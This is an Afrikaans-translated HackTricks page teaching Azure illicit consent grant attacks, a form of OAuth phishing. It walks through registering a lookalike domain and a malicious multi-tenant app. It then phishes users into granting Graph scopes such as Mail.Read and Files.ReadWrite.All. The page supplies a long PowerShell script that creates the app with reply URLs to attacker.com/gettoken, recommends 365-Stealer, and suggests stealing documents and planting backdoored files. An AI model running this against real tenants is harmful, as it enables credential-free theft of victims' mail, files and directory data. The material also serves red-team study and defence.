# Az - Illicit Consent Grant

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications** vra vir toestemmings om toegang tot die **gebruikerdata** te kry (basiese inligting, maar ook toegang tot dokumente, stuur e-posse...).\
As **toegelaat**, kan 'n normale gebruiker slegs toestemming gee vir **"Low Impact" toestemmings**. In **alle ander** gevalle is **admin-toestemming nodig**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n pasgemaakte rol wat `toestemming om toestemmings aan toepassings te gee` insluit, kan toestemming vir die hele huurdersbasis gee.

Slegs toestemmings wat **nie admin-toestemming vereis nie** word as **lae impak** geklassifiseer. Dit is toestemmings wat nodig is vir **basiese aanmelding soos openid, profiel, e-pos, User.Read en offline\_access**. As 'n **organisasie** **toelaat** dat gebruikers toestemming gee vir **alle toepassings**, kan 'n werknemer toestemming gee aan 'n toepassing om **die bogenoemde van hul profiel te lees**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Daarom kan 'n aanvaller 'n **kwaadwillige App** voorberei en met 'n **phishing**, die gebruiker laat **die App aanvaar en sy data steel**.

### 2 Soorte Illicit Consent Grant Aanvalle

* **Ongemagtig**: Vanaf 'n eksterne rekening skep 'n toepassing met die toestemmings `User.Read` en `User.ReadBasic.All` byvoorbeeld, phish 'n gebruiker, en jy sal in staat wees om toegang tot gidsinligting te kry.
* Dit vereis dat die gephishde gebruiker in staat is om OAuth-toepassings van eksterne omgewings te aanvaar!
* **Gemagtig**: Nadat 'n hoof met genoeg voorregte gekompromitteer is, skep 'n toepassing binne die rekening en phish 'n voorregte gebruiker wat voorregte OAuth-toestemmings kan aanvaar.
* In hierdie geval kan jy reeds toegang tot die inligting van die gids kry, so die toestemming `User.ReadBasic.All` is nie meer interessant nie.
* Jy is waarskynlik ge√Ønteresseerd in **toestemmings wat 'n admin vereis om dit te gee**, want gewone gebruikers kan geen toestemming aan OAuth-toepassings gee nie, daarom moet jy **slegs daardie gebruikers phish** (meer oor watter rolle/toestemmings hierdie voorreg gee later)

### Kyk of gebruikers toegelaat word om toestemming te gee

Die volgende PowerShell-opdrag word gebruik om die toestemmingskonfigurasie vir gebruikers in Azure Active Directory (Azure AD) na te gaan rakende hul vermo√´ om toestemming aan toepassings te gee:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Deaktiveer gebruikerskonsent**: Hierdie instelling verbied gebruikers om toestemmings aan toepassings te gee. Geen gebruikerskonsent vir toepassings word toegelaat nie.
* **Gebruikers kan toestem tot toepassings van geverifieerde uitgewers of jou organisasie, maar slegs vir toestemmings wat jy kies**: Hierdie instelling laat alle gebruikers toe om slegs toestemming te gee aan toepassings wat deur 'n geverifieerde uitgewer gepubliseer is en toepassings wat in jou eie huurkontrak geregistreer is. Dit voeg 'n laag van beheer by deur slegs toestemming vir spesifieke toestemmings toe te laat.
* **Gebruikers kan tot alle toepassings toestem**: Hierdie instelling is meer permissief en laat alle gebruikers toe om enige toestemmings vir toepassings te gee, solank daardie toestemmings nie administratiewe toestemming vereis nie.
* **Pasgemaakte toepassingskonsentbeleid**: Hierdie instelling dui aan dat 'n pasgemaakte beleid in plek is, wat aangepas kan word vir spesifieke organisatoriese vereistes en mag 'n kombinasie van beperkings behels gebaseer op die toepassingsuitgewer, die toestemmings wat die toepassing versoek, en ander faktore.

## **Begrip van Illegale Konsenttoestemmingsaanval**

In 'n illegale konsenttoestemmingsaanval mislei aanvallers eindgebruikers om toestemmings aan 'n kwaadwillige toepassing wat by Azure geregistreer is, te gee. Dit word gedoen deur die toepassing wettig te laat lyk, wat daartoe lei dat slagoffers onbewustelik op 'n "Aanvaar" knoppie klik. As gevolg hiervan, gee Azure AD 'n teken aan die aanvaller se webwerf, wat hulle toelaat om toegang tot en manipulasie van die slagoffer se data te kry, soos om e-posse te lees of te stuur en l√™ers te bekom, sonder om 'n organisatoriese rekening nodig te h√™.

## **Aanvalvloei Oorsig**

Die aanval behels verskeie stappe wat 'n generiese maatskappy teiken. Hier is hoe dit kan ontvou:

1. **Domeinregistrasie en Toepassinghosting**: Die aanvaller registreer 'n domein wat soos 'n betroubare webwerf lyk, byvoorbeeld "safedomainlogin.com". Onder hierdie domein word 'n subdomein geskep (bv. "companyname.safedomainlogin.com") om 'n toepassing te huisves wat ontwerp is om magtigingskodes vas te vang en toegangstekens aan te vra.
2. **Toepassingsregistrasie in Azure AD**: Die aanvaller registreer dan 'n Multi-Tenant Toepassing in hul Azure AD Huurkontrak, en noem dit na die teikenmaatskappy om wettig te lyk. Hulle konfigureer die toepassing se Herleidings-URL om na die subdomein te wys wat die kwaadwillige toepassing huisves.
3. **Opstel van Toestemmings**: Die aanvaller stel die toepassing op met verskeie API-toestemmings (bv. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Hierdie toestemmings, sodra dit deur die gebruiker gegee is, laat die aanvaller toe om sensitiewe inligting namens die gebruiker te onttrek.
4. **Verspreiding van Kwaadwillige Skakels**: Die aanvaller skep 'n skakel wat die kli√´nt-ID van die kwaadwillige toepassing bevat en deel dit met geteikende gebruikers, wat hulle mislei om toestemming te gee.

## **Gebruik van Gereedskap vir die Aanval**

Die aanval kan gefasiliteer word deur gereedskap soos [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Voorbereiding voor die Aanval:

As die aanvaller 'n mate van toegang tot 'n gebruiker in die slagofferorganisasie het, kan hulle kyk of die organisasie se beleid die gebruiker toelaat om toepassings te aanvaar:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Vir die uitvoering van die aanval, sal die aanvaller 'n **nuwe App in hul Azure Tenant** moet skep (in App-registrasies), gekonfigureer met die toestemmings:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` is binne `Microsoft Graph` in `Delegated permissions`. (Aansoektoestemmings sal altyd ekstra goedkeuring benodig).

* `User.ReadBasic.All` is die toestemming wat jou sal toelaat om **inligting van al die gebruikers** in die organisasie te lees indien toegestaan.
* Onthou dat slegs `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n pasgemaakte rol wat `toestemming om toestemmings aan toepassings te verleen` insluit, huurderswye toestemming kan verleen. Dus, jy moet **'n gebruiker met een van daardie rolle phish** as jy wil h√™ hy moet 'n **App wat administratiewe toestemming vereis** goedkeur.

Jy kan ook 'n App via cli skep met:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Kyk na [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) om te leer hoe om dit te konfigureer.

{% hint style="warning" %}
Let daarop dat die verkryde **toegangstoken** vir die **grafiek-eindpunt** sal wees met die toestemmings: `User.Read` en `User.ReadBasic.All` (die versoekte toestemmings). Jy sal nie ander aksies kan uitvoer nie (maar dit is genoeg om **inligting oor al die gebruikers** in die organisasie af te laai).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Jy kan ook hierdie hulpmiddel gebruik om hierdie aanval uit te voer.

## Post-eksploitasie

Sodra jy toegang tot die gebruiker het, kan jy dinge doen soos om sensitiewe dokumente te steel en selfs agterdeur-dokumentl√™ers op te laai.

## Verwysings

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
{% endhint %}
